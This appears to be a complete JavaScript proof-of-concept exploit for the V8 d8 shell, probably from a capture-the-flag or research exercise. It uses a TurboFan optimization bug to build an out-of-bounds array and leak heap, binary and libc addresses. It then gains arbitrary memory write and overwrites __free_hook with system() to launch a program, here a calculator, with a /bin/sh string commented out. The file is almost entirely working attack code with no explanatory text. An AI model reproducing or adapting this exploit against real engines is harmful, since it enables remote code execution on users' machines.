const MAX_ITERATIONS = 0x10000;
var maxSize = 1028*8;

var buf =new ArrayBuffer(16);
var float64 = new Float64Array(buf);
var bigUint64 = new BigUint64Array(buf);
var uint32 = new Uint32Array(buf);
// Floating point to 64-bit unsigned integer
function f2i(f)
{
    float64[0] = f;
    return bigUint64[0];
}
// 64-bit unsigned integer to Floating point
function i2f(i)
{
    bigUint64[0] = i;
    return float64[0];
}

function f2half(val)
{
    float64[0]= val;
    let tmp = Array.from(uint32);
    return tmp;
}

function half2f(val)
{
    uint32.set(val);
    return float64[0];
}
// 64-bit unsigned integer to hex
function hex(i)
{
    return "0x"+i.toString(16).padStart(16, "0");
}

// gc function to move data to old space
function gc() {
    for (let i = 0; i < 100; i++) {
        new ArrayBuffer(0x100000);
    }
}

// vuln write
function foo_write(idx, val)
{
    // o[idx] = 1028*8;  // i2f((1028*8)<<2)
    o[idx] = val;
}

// vuln read
function foo_read(idx)
{
    return o[idx];
}

// mark o's map to stable
var o = [1.1, 2.2];
o.x = {};

// optimize foo function
for(let i=0; i<MAX_ITERATIONS; i++) {
    foo_write(0, 1.1);
    foo_read(0);

}

// change o's map to dictionary
o[0x100000] = 3;

// build memory layout
var oob_array = [1.1, 2.2];
var padding = [{},1];  // padding the address

var ab = new ArrayBuffer(200);
// %DebugPrint(oob_array);
// %DebugPrint(ab);
// %SystemBreak();

gc();
gc();

// leak the date first for pointer compression (keep the data)
var len_int_val = f2half(foo_read(0x14));
// print(len_int_val);
// %DebugPrint(o);
// %DebugPrint(oob_array);
// %SystemBreak(); 
len_int_val[1]=1028*8*2;   // change the lenth
var len_float_val = half2f(len_int_val);
foo_write(0x14, len_float_val);
if(oob_array.length != 8224)
{
    throw "[-] oob array build failed";
}
print("[+] now the oob array's length: " + oob_array.length);

// %DebugPrint(oob_array);
//%SystemBreak();
// make sure the backing store offset
if(f2i(oob_array[0xd])!=0xc8) {
    throw "[-] offset error";
}

// get the heap addr
var heap_addr = f2i(oob_array[0xe]);
print("[+] leak heap addr: "+hex(heap_addr));

// build databiew
var data_view = new DataView(ab);

// set addr primitive
function turbofan_set_addr(idx, addr)
{
    oob_array[idx] = addr;
}

function data_view_write(addr, payload)
{
    oob_array[0xe] = i2f(addr);
    for(let i=0; i<payload.length; i++) {
        data_view.setUint8(i, payload[i]);
    }
}

// aaw primitive
function data_view_write64(addr, val) {
    oob_array[0xe] = i2f(addr);
    data_view.setFloat64(0, i2f(val), true);
}

// optimize set addr primitive
for(let i=0; i<MAX_ITERATIONS; i++) {
    turbofan_set_addr(i%1, 1.1+i);
}

// search text addr by bruteforce checking
var leak = 0;
var text_base = 0;
var found_count = 0;
for(let i=0n; i<0x1000n; i+=8n) {
    turbofan_set_addr(0xe, i2f(heap_addr-i));
    leak = f2i(data_view.getFloat64(0,true));
    //print("addr: "+hex(heap_addr+i)+" ,val: "+hex(leak));
    //data_view.setFloat64(0, 1.1, true);
     //%DebugPrint(ab);
     //%SystemBreak();
    if( (leak >>40n) == 0x55n || (leak >> 40n) == 0x56n ) { 
        found_count += 1;
        // print(hex(leak));
        if(found_count == 30)
        {
            text_base = leak & 0xfffffffffffff000n;
            break;
        }
    }
}

if(text_base == 0) {
    throw "[-] find text base error";
}

// get text base
print("[+] start finding d8 text base from: "+hex(text_base));
// %SystemBreak();
// while(true) {};
while (true) {
    turbofan_set_addr(0xe, i2f(text_base));
    leak = f2i(data_view.getFloat64(0, true));
    //print(hex(leak));
    if((leak & 0xffffffffn) == 0x464c457fn) {
        break;
    }
    text_base -= 0x1000n;
}

print("[+] d8 text base: " + hex(text_base));

let libc_start_main_got = text_base + 0x1341560n;

turbofan_set_addr(0xe, i2f(libc_start_main_got));
let libc_start_main_addr = f2i(data_view.getFloat64(0, true));
let libc_base = libc_start_main_addr - 0x21ab0n;
print("[+] libc base: " + hex(libc_base));

let free_hook_addr = libc_base + 0x3ed8e8n;
print("[+] free hook addr: " + hex(free_hook_addr));
let system_addr = libc_base +  0x4f440n;
print("[+] system addr: "+ hex(system_addr));


// overwrite free_hook to system
data_view_write64(free_hook_addr, system_addr);

// trigger free to execute command
function get_shell()
{
    let get_shell_buffer = new ArrayBuffer(0x1000);
    let get_shell_dataview = new DataView(get_shell_buffer);
    //get_shell_dataview.setFloat64(0, i2f(0x0068732f6e69622fn), true); // str --> /bin/sh\x00
    get_shell_dataview.setFloat64(0, i2f(0x69622f70616e732fn), true); // /snap/bi
    get_shell_dataview.setFloat64(8, i2f(0x2d656d6f6e672f6en), true); // n/gnome-
    get_shell_dataview.setFloat64(16, i2f(0x74616c75636c6163n), true); // calculat
    get_shell_dataview.setFloat64(24, i2f(0x726fn), true); // or
    //%DebugPrint(get_shell_dataview);
    //%SystemBreak();


}
get_shell();
